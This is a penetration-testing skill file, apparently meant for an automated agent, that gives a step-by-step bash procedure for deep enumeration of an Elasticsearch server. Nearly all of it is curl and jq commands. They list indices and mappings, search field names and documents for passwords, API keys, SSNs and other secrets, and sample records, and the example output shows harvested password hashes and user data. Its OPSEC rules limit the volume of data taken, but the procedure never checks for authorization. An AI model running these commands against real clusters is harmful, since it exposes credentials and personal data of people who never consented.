---
name: db-elasticsearch-deep
description: Deep Elasticsearch enumeration for cluster health, indices, documents, and sensitive data discovery
version: 1.0.0
phase: enum
category: database
tags: [database, elasticsearch, search]
tools: [curl, elasticdump, nmap]
difficulty: intermediate
opsec_level: medium
time_estimate: 60s
severity_if_found: critical
related_skills:
  - elasticsearch-opensearch
  - db-mongodb-enum
mitre_attack:
  - T1213
  - T1530
---

## When to Use

Use this skill for deep enumeration of Elasticsearch instances (port 9200)
beyond basic health checks. Extracts index mappings, samples documents,
and searches for sensitive fields systematically.

## Prerequisites

- curl
- jq (for JSON parsing)
- elasticdump (optional, for data export)
- nmap (for service detection)

## Procedure

```bash
# Step 1: Cluster health and version
curl -sk https://TARGET:9200/
curl -sk https://TARGET:9200/_cluster/health?pretty | jq '{status, timed_out, number_of_nodes, active_primary_shards}'

# Step 2: List all indices with metadata
curl -sk https://TARGET:9200/_cat/indices?v&h=index,status,docs.count,store.size,creation.date.string | sort -k4 -n -r

# Step 3: Get field mappings for each index
curl -sk https://TARGET:9200/_mapping?pretty | jq 'to_entries[] | {index: .key, fields: [.value.mappings.properties | keys[]]}'

# Step 4: Search for sensitive field names
curl -sk https://TARGET:9200/_mapping?pretty | jq 'to_entries[].value.mappings.properties | keys[]' | sort -u | grep -iE "pass|secret|token|key|credential|ssn|email|phone|address"

# Step 5: Sample documents from sensitive indices
for idx in $(curl -sk https://TARGET:9200/_cat/indices?h=index | head -5); do
  curl -sk "https://TARGET:9200/$idx/_search?size=2&pretty" | jq '.hits.hits[]._source'
done

# Step 6: Query for credentials across all indices
curl -sk "https://TARGET:9200/_search?pretty" -H 'Content-Type: application/json' -d '{"query":{"query_string":{"query":"password OR secret OR api_key"}},"size":5}' | jq '.hits.hits[]._source'

# Step 7: Check cluster settings
curl -sk https://TARGET:9200/_cluster/settings?pretty | jq '.persistent, .transient'

# Step 8: List snapshots and repositories
curl -sk https://TARGET:9200/_snapshot?pretty | jq '.'
```

## OPSEC Rules

- Do NOT run heavy aggregations or deep pagination
- Do NOT modify index mappings or cluster settings
- Do NOT export or exfiltrate data beyond proof-of-concept
- Limit search queries to 5-10 documents per index
- Log all queries for audit trail

## Verification

- Confirm cluster health (green/yellow/red)
- Verify index listing contains meaningful data
- Confirm sensitive field search returns results

## Pitfalls

- Large clusters may have hundreds of indices — sample strategically
- Some fields may be nested deeply in mappings
- Elastic Cloud / hosted instances use different auth (API key)
- Index names may follow date patterns (logs-2024.01.*)

## Output Format

```
[ES]      Cluster: production — health: GREEN — 12 nodes
[ES]      Indices: app_logs (23M), users (142K), payments (890K), analytics (5M)
[ES]      Sensitive fields: password_hash, email, ssn, api_key, credit_card
[SAMPLE]  users.doc: { email: user@example.com, password_hash: $2y$10$..., role: admin }
[CONFIG]  xpack.security.enabled: false
[SNAPSHOT] s3-backup — latest: 2024-01-15
[CRITICAL] Unauthenticated Elasticsearch — 142K user records with password hashes
```
